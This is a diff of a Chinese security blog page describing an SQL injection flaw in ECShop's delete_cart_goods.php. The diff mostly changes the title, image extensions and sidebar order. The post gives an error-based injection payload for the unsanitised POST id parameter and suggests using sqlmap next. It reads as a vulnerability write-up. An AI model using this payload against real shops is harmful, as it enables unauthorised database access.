@@ -20,7 +20,7 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
   <meta name="renderer" content="webkit">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" , user-scalable="no"">
-  <title>ecshop-delete-cart-goods-php-注入漏洞乔巴Doctor</title>
+  <title>ecshop(delete_cart_goods.php)注入漏洞乔巴Doctor</title>
   <link rel="shortcut icon" href>
   
     
@@ -107,7 +107,7 @@
             </header>
                 
 <header class="blog-post-page-title">
-    <h4>ecshop-delete-cart-goods-php-注入漏洞</h4>
+    <h4>ecshop(delete_cart_goods.php)注入漏洞</h4>
     <time datetime="2019-05-19T11:52:50.000Z"><i class="fa fa-clock-o"></i>2019-05-19</time>
     
     
@@ -132,11 +132,11 @@
 <ul>
 <li>问题还是一样的。这里的$_POST[‘id’]直接带入了query($sql)</li>
 </ul>
-<p><img src="./burp截图.jpg" alt="burp截图"><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="string">`etshop`</span>.<span class="string">`ecs_cart`</span> <span class="keyword">WHERE</span> rec_id=xxx</span><br><span class="line"><span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">'xxx'</span> <span class="keyword">in</span> <span class="string">'where clause'</span></span><br></pre></td></tr></table></figure></p>
-<p><em>提示找不到xxx这个字段。那我们随便写一个存在的不就好了~<br>首先来测试数字型的：<br><img src="./burp截图2.jpg" alt="burp截图2">
-</em>我们再测试下字符型的<br><img src="./burp截图3.jpg" alt="burp截图3"><br>*随便赋予id值，都会带入sql语句<br>比如:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></p>
+<p><img src="./burp截图.png" alt="burp截图"><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="string">`etshop`</span>.<span class="string">`ecs_cart`</span> <span class="keyword">WHERE</span> rec_id=xxx</span><br><span class="line"><span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">'xxx'</span> <span class="keyword">in</span> <span class="string">'where clause'</span></span><br></pre></td></tr></table></figure></p>
+<p><em>提示找不到xxx这个字段。那我们随便写一个存在的不就好了~<br>首先来测试数字型的：<br><img src="./burp截图2.png" alt="burp截图2">
+</em>我们再测试下字符型的<br><img src="./burp截图3.png" alt="burp截图3"><br>*随便赋予id值，都会带入sql语句<br>比如:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></p>
 <p>*完整的sql语句就变成了<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="string">`etshop`</span>.<span class="string">`ecs_cart`</span> <span class="keyword">WHERE</span> rec_id=a <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></p>
-<p><img src="./burp截图4.jpg" alt="burp截图4"></p>
+<p><img src="./burp截图4.png" alt="burp截图4"></p>
 <p>文章转自0day5<br>*直接用hackbar在在post里面添加id参数加’如果报错就可以直接s用sqlmap去跑，如果是ecshop自带的加密一般是解不开的。</p>
 
             
@@ -345,13 +345,13 @@
                       </li>
                     
                       <li class="list-group-item justify-content-between">
-                          <a href="/categories/生活趣事/">生活趣事</a>
-                          <span class="badge badge-default badge-pill">2</span>
+                          <a href="/categories/k先生专栏/">k先生专栏</a>
+                          <span class="badge badge-default badge-pill">1</span>
                       </li>
                     
                       <li class="list-group-item justify-content-between">
-                          <a href="/categories/k先生专栏/">k先生专栏</a>
-                          <span class="badge badge-default badge-pill">1</span>
+                          <a href="/categories/生活趣事/">生活趣事</a>
+                          <span class="badge badge-default badge-pill">2</span>
                       </li>
                     
                       <li class="list-group-item justify-content-between">
@@ -367,17 +367,17 @@
                 <ul class="blog-sidebar-tags-ul blog-sidebar-padding">
                   
                     
-                      <li><a href="/tags/sqlserver/" class="tag-could" data-toggle="tooltip" data-placement="top" title="sqlserver">sqlserver</a></li>
-                    
                       <li><a href="/tags/ctf/" class="tag-could" data-toggle="tooltip" data-placement="top" title="ctf">ctf</a></li>
                     
-                      <li><a href="/tags/闲聊/" class="tag-could" data-toggle="tooltip" data-placement="top" title="闲聊">闲聊</a></li>
+                      <li><a href="/tags/sqlserver/" class="tag-could" data-toggle="tooltip" data-placement="top" title="sqlserver">sqlserver</a></li>
                     
                       <li><a href="/tags/cms/" class="tag-could" data-toggle="tooltip" data-placement="top" title="cms">cms</a></li>
                     
+                      <li><a href="/tags/k先生/" class="tag-could" data-toggle="tooltip" data-placement="top" title="k先生">k先生</a></li>
+                    
                       <li><a href="/tags/技术/" class="tag-could" data-toggle="tooltip" data-placement="top" title="技术">技术</a></li>
                     
-                      <li><a href="/tags/k先生/" class="tag-could" data-toggle="tooltip" data-placement="top" title="k先生">k先生</a></li>
+                      <li><a href="/tags/闲聊/" class="tag-could" data-toggle="tooltip" data-placement="top" title="闲聊">闲聊</a></li>
                     
                       <li><a href="/tags/吐槽/" class="tag-could" data-toggle="tooltip" data-placement="top" title="吐槽">吐槽</a></li>
                     
@@ -385,9 +385,9 @@
                     
                       <li><a href="/tags/cmd命令/" class="tag-could" data-toggle="tooltip" data-placement="top" title="cmd命令">cmd命令</a></li>
                     
-                      <li><a href="/tags/过狗/" class="tag-could" data-toggle="tooltip" data-placement="top" title="过狗">过狗</a></li>
-                    
                       <li><a href="/tags/中华人民共和国网络安全法/" class="tag-could" data-toggle="tooltip" data-placement="top" title="中华人民共和国网络安全法">中华人民共和国网络安全法</a></li>
+                    
+                      <li><a href="/tags/过狗/" class="tag-could" data-toggle="tooltip" data-placement="top" title="过狗">过狗</a></li>
                     
                   
                 </ul>
